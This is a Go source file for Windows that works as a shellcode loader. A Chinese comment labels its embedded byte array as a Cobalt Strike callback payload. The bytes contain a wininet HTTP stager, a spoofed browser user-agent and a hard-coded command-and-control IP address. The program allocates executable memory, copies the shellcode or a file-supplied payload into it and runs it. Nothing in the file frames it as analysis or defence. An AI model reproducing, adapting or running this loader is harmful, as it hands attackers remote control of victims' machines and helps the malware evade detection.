package main

import (
    "io/ioutil"
    "os"
    "syscall"
    "unsafe"
)

const (
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

var (
    kernel32       = syscall.MustLoadDLL("kernel32.dll")
    ntdll          = syscall.MustLoadDLL("ntdll.dll")
    VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
    RtlCopyMemory  = ntdll.MustFindProc("RtlCopyMemory")
    // SHELLCODE 存放地址 CS上线
    shellcode_buf = []byte{ 
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x93, 0x00, 0x00, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0xce, 0x28, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x64, 0x63, 0x55, 0x41, 0x00, 0xbf, 0xd1, 0xb5, 0xc3, 0x66, 0xc5, 0xcf, 0xce, 0xeb, 0xcb, 0x46, 0xc6, 0x20, 0xc1, 0x64, 0x41, 0x00, 0x84, 0x8e, 0xd3, 0x88, 0x89, 0x1b, 0xa9, 0x70, 0xea, 0x06, 0xcc, 0xcf, 0xc7, 0xd6, 0xf0, 0xc3, 0xd2, 0xfd, 0xd7, 0xed, 0xb3, 0x3f, 0xa0, 0x3f, 0x95, 0x45, 0x56, 0xfb, 0x4c, 0xca, 0xae, 0xf0, 0xf1, 0x64, 0x65, 0x0a, 0x2c, 0xa8, 0x3b, 0x25, 0x5b, 0xd2, 0x5e, 0x4a, 0x96, 0x7b, 0xb0, 0xa2, 0x4e, 0xc2, 0x73, 0xca, 0x61, 0x88, 0x77, 0x26, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x4d, 0x41, 0x4c, 0x43, 0x29, 0x0d, 0x0a, 0x00, 0x64, 0x17, 0x01, 0xed, 0xf8, 0x67, 0x08, 0xf5, 0x6d, 0x31, 0x7b, 0x63, 0x68, 0x80, 0xf2, 0x6d, 0xdf, 0xed, 0x0d, 0x38, 0x71, 0xbd, 0xce, 0x57, 0xf3, 0x41, 0x6f, 0x34, 0x55, 0x1a, 0x49, 0x6d, 0x99, 0x38, 0xf4, 0xa3, 0x9a, 0xe3, 0x90, 0x74, 0x11, 0xa4, 0x12, 0xca, 0x37, 0xc2, 0x15, 0x99, 0x40, 0xca, 0x25, 0x33, 0x5e, 0xe4, 0xd2, 0xd4, 0xf9, 0x10, 0xbc, 0xcb, 0x80, 0xa7, 0xc3, 0x28, 0xe1, 0x4c, 0xae, 0x1f, 0xf9, 0xea, 0xd8, 0x22, 0x2c, 0x59, 0x7d, 0x2a, 0x06, 0x20, 0xe2, 0x49, 0x8e, 0xad, 0x6e, 0x52, 0xfd, 0xcd, 0x44, 0xb6, 0xc7, 0x95, 0x9e, 0xe6, 0x79, 0x59, 0xbd, 0xa3, 0xcb, 0xb2, 0x96, 0xa8, 0x77, 0xa7, 0xd2, 0xe6, 0xa7, 0xaa, 0x92, 0x01, 0xc2, 0xcd, 0x72, 0x84, 0xfd, 0xe0, 0xa8, 0xac, 0xe1, 0x30, 0x14, 0x5c, 0xf0, 0xc8, 0xf3, 0x09, 0x6b, 0x80, 0xfc, 0x57, 0x9e, 0xa2, 0xaf, 0xf9, 0xc6, 0x82, 0x8d, 0xe1, 0xfe, 0x9d, 0x69, 0x55, 0x7f, 0x95, 0x4f, 0x2e, 0x90, 0x25, 0x85, 0xc3, 0xe4, 0x4f, 0x0a, 0xaf, 0x94, 0x67, 0xd0, 0xae, 0xeb, 0x78, 0x9d, 0x9c, 0xb8, 0x15, 0xad, 0xea, 0xfd, 0x71, 0xc7, 0xe2, 0xf1, 0x7a, 0xcb, 0x22, 0xe6, 0x6c, 0x47, 0x7c, 0xdf, 0x61, 0xd7, 0xd0, 0x00, 0x15, 0xeb, 0x6a, 0x08, 0x30, 0x4b, 0x83, 0xc1, 0x7a, 0xbb, 0x9e, 0x50, 0x07, 0xca, 0xaa, 0xc4, 0xb3, 0x44, 0x50, 0x27, 0xf8, 0xf1, 0xa9, 0xe0, 0xd2, 0x82, 0x31, 0x69, 0x3b, 0x97, 0x36, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff, 0x31, 0x32, 0x38, 0x2e, 0x31, 0x2e, 0x31, 0x33, 0x35, 0x2e, 0x38, 0x30, 0x00, 0x12, 0x34, 0x56, 0x78,
    }
)

func checkErr(err error) {
    if err != nil {
        if err.Error() != "The operation completed successfully." {
            println(err.Error())
            os.Exit(1)
        }
    }
}

func main() {
    shellcode := shellcode_buf
    if len(os.Args) > 1 {
        shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
        checkErr(err)
        shellcode = shellcodeFileData
    }

    addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if addr == 0 {
        checkErr(err)
    }
    _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    checkErr(err)
    syscall.Syscall(addr, 0, 0, 0, 0)
}

